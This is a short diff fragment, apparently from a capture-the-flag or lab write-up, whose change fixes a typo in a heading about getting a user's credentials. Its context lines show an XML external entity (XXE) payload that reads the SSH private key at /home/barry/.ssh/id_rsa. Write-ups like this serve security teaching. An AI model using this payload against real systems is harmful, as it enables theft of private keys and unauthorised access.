@@ -86,7 +86,7 @@ Lets go back and see what we missed...
 </comment>
 
 <br>
-## This works, Lets now try and get barries credentials:
+## This works, Lets now try and get barry's credentials:
 
 < ?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [<!ENTITY test SYSTEM 'file:///home/barry/.ssh/id_rsa'>]>
